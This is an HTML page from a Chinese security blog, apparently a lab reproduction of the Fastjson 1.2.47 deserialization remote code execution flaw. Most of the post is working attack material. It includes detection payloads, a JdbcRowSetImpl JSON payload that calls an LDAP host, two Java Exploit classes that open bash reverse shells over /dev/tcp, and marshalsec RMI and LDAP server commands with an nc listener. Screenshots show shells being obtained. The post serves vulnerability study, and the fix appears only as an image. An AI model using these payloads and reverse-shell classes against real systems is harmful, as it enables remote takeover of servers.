@@ -1,0 +1,805 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/32x32.png?v=7.4.1">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/16x16.png?v=7.4.1">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.1" color="#222">
+  <link rel="alternate" href="/atom.xml" title="C0cho's blog" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.1">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.1',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="本文主要复现Fastjson 1.2.47 远程命令执行漏洞判断是否使用fastjson启动环境，可以根据logo图标判断是否使用了fastjson转换为post方式提交，查看放回包也可以判断是否使用了fastjsonDNSLog判断判断payload12345678&amp;#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;, &quot;val&quot;:&quot;dnslog&quot;&amp;#125;&amp;#123;&quot;">
+<meta name="keywords" content="Fastjson">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson反序列化漏洞复现">
+<meta property="og:url" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/index.html">
+<meta property="og:site_name" content="C0cho&#39;s blog">
+<meta property="og:description" content="本文主要复现Fastjson 1.2.47 远程命令执行漏洞判断是否使用fastjson启动环境，可以根据logo图标判断是否使用了fastjson转换为post方式提交，查看放回包也可以判断是否使用了fastjsonDNSLog判断判断payload12345678&amp;#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;, &quot;val&quot;:&quot;dnslog&quot;&amp;#125;&amp;#123;&quot;">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013165844484.png">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015140321953.png">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015134453665.png">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201014193236513.png">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013215823894.png">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013220111504.png">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015141543905.png">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015141512313.png">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015141635598.png">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015183410772.png">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015183508190.png">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015183614612.png">
+<meta property="og:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015134754660.png">
+<meta property="og:updated_time" content="2020-10-27T03:27:51.568Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="fastjson反序列化漏洞复现">
+<meta name="twitter:description" content="本文主要复现Fastjson 1.2.47 远程命令执行漏洞判断是否使用fastjson启动环境，可以根据logo图标判断是否使用了fastjson转换为post方式提交，查看放回包也可以判断是否使用了fastjsonDNSLog判断判断payload12345678&amp;#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;, &quot;val&quot;:&quot;dnslog&quot;&amp;#125;&amp;#123;&quot;">
+<meta name="twitter:image" content="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013165844484.png">
+  <link rel="canonical" href="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>fastjson反序列化漏洞复现 | C0cho's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0cho's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">less is more</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+        
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">44</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">8</span></a>
+
+  </li>
+      
+    
+      
+      
+        
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">76</span></a>
+
+  </li>
+      
+    
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger">
+          <i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0cho">
+      <meta itemprop="description" content="记录生活的点点滴滴">
+      <meta itemprop="image" content="/images/author.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0cho's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+            fastjson反序列化漏洞复现
+            
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-10-12 16:23:02" itemprop="dateCreated datePublished" datetime="2020-10-12T16:23:02+08:00">2020-10-12</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-10-27 11:27:51" itemprop="dateModified" datetime="2020-10-27T11:27:51+08:00">2020-10-27</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞复现</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>3k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>3 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>本文主要复现Fastjson 1.2.47 远程命令执行漏洞</p><h3 id="判断是否使用fastjson"><a href="#判断是否使用fastjson" class="headerlink" title="判断是否使用fastjson"></a>判断是否使用fastjson</h3><p>启动环境，可以根据logo图标判断是否使用了fastjson</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013165844484.png" alt="image-20201013165844484"></p><p>转换为post方式提交，查看放回包也可以判断是否使用了fastjson</p><p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015140321953.png" alt="image-20201015140321953"></p><p>DNSLog判断</p><p>判断payload</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"java.net.Inet4Address"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"java.net.Inet6Address"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"java.net.InetSocketAddress"</span>&#123;<span class="string">"address"</span>:, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;&#125;</span><br><span class="line">&#123;<span class="string">"@type"</span>:<span class="string">"com.alibaba.fastjson.JSONObject"</span>, &#123;<span class="string">"@type"</span>: <span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;&#125;<span class="string">""</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">"@type"</span>:<span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;:<span class="string">"aaa"</span>&#125;</span><br><span class="line">Set[&#123;<span class="string">"@type"</span>:<span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;]</span><br><span class="line">Set[&#123;<span class="string">"@type"</span>:<span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;</span><br><span class="line">&#123;&#123;<span class="string">"@type"</span>:<span class="string">"java.net.URL"</span>, <span class="string">"val"</span>:<span class="string">"dnslog"</span>&#125;:<span class="number">0</span></span><br></pre></td></tr></table></figure><a id="more"></a>
+
+
+
+
+
+
+
+
+<p>以上payload填入以下代码{“a”:}中的:后面</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"ldap://6v0jfv.dnslog.cn"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>DNSLog有回显，存在fastjson</p>
+<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015134453665.png" alt="image-20201015134453665"></p>
+<h3 id="RMI模式getshell"><a href="#RMI模式getshell" class="headerlink" title="RMI模式getshell"></a>RMI模式getshell</h3><p>exp项目地址：<a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="noopener">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
+<p>代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/127.0.0.1/8888 0&gt;&amp;1"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>VPS中下载此项目，将其中ip和监听端口修改为vps的ip和需要监听的端口，同时使用nc监听1234端口，<code>nc -lvvp 1234</code></p>
+<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201014193236513.png" alt="image-20201014193236513"></p>
+<p><code>javac Exploit.java</code>编译出Exploit.class文件</p>
+<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013215823894.png" alt="image-20201013215823894"></p>
+<p>vps启动一个web服务，要求能访问到Exploit.class</p>
+<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201013220111504.png" alt="image-20201013220111504"></p>
+<p>VPS启一个rmi监听9999端口</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span>.<span class="number">3</span>-SNAPSHOT-all<span class="selector-class">.jar</span> marshalsec<span class="selector-class">.jndi</span><span class="selector-class">.RMIRefServer</span> <span class="string">"http://vpsip:8082/#Exploit"</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015141543905.png" alt="image-20201015141543905"></p>
+<p>Burpsuite将请求转换为post模式，执行以下payload，注意如果无法解析json需要在请求头中加入<code>COntent-Type: application/json</code></p>
+<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015141512313.png" alt="image-20201015141512313"></p>
+<p>vps反弹shell，执行命令成功</p>
+<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015141635598.png" alt="image-20201015141635598"></p>
+<h3 id="ldap模式getshell"><a href="#ldap模式getshell" class="headerlink" title="ldap模式getshell"></a>ldap模式getshell</h3><p>vps执行如下代码</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-<span class="number">0.0</span>.<span class="number">3</span>-SNAPSHOT-all<span class="selector-class">.jar</span> marshalsec<span class="selector-class">.jndi</span><span class="selector-class">.LDAPRefServer</span> <span class="string">"http://vpsip:8082/#Exploit"</span> <span class="number">9999</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015183410772.png" alt="image-20201015183410772"></p>
+<p>Burpsuite执行如下payload</p>
+<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015183508190.png" alt="image-20201015183508190"></p>
+<p>成功反弹shell</p>
+<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015183614612.png" alt="image-20201015183614612"></p>
+<p>修复参考如下</p>
+<p><img src="//choge.top/2020/10/12/fastjson反序列化漏洞复现/image-20201015134754660.png" alt="image-20201015134754660"></p>
+<p>其他java利用代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/192.168.142.44/5555;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cnblogs.com/hei-zi/p/13274272.html" target="_blank" rel="noopener">https://www.cnblogs.com/hei-zi/p/13274272.html</a></p>
+<p>fastjson绕过</p>
+<p><a href="https://mp.weixin.qq.com/s/pL338gF1pfF2c8WA5rTEcw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/pL338gF1pfF2c8WA5rTEcw</a></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+      
+        <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+      
+    </div>
+        
+      
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>C0cho
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://choge.top/2020/10/12/fastjson反序列化漏洞复现/" title="fastjson反序列化漏洞复现">https://choge.top/2020/10/12/fastjson反序列化漏洞复现/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+      
+
+      <footer class="post-footer">
+          
+            
+          
+          <div class="post-tags">
+            
+              <a href="/tags/Fastjson/" rel="tag"># Fastjson</a>
+            
+          </div>
+        
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2020/10/12/Thinkphp5远程代码执行漏洞复现/" rel="next" title="Thinkphp5远程代码执行漏洞复现">
+                  <i class="fa fa-chevron-left"></i> Thinkphp5远程代码执行漏洞复现
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2020/10/15/Weblogic漏洞复现/" rel="prev" title="Weblogic漏洞复现">
+                  Weblogic漏洞复现 <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#判断是否使用fastjson"><span class="nav-number">1.</span> <span class="nav-text">判断是否使用fastjson</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RMI模式getshell"><span class="nav-number">2.</span> <span class="nav-text">RMI模式getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ldap模式getshell"><span class="nav-number">3.</span> <span class="nav-text">ldap模式getshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">4.</span> <span class="nav-text">参考</span></a></li></ol></div>
+        
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/author.jpg"
+      alt="C0cho">
+  <p class="site-author-name" itemprop="name">C0cho</p>
+  <div class="site-description" itemprop="description">记录生活的点点滴滴</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">76</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+          
+            <a href="/categories/">
+          
+        
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        <span class="site-state-item-count">44</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+</div>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/yourname" title="GitHub &rarr; https://github.com/yourname" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="mailto:yourname@gmail.com" title="E-Mail &rarr; mailto:yourname@gmail.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0cho</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    
+    <span title="站点总字数">262k</span>
+</div>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.1"></script><script src="/js/motion.js?v=7.4.1"></script>
+<script src="/js/schemes/pisces.js?v=7.4.1"></script>
+
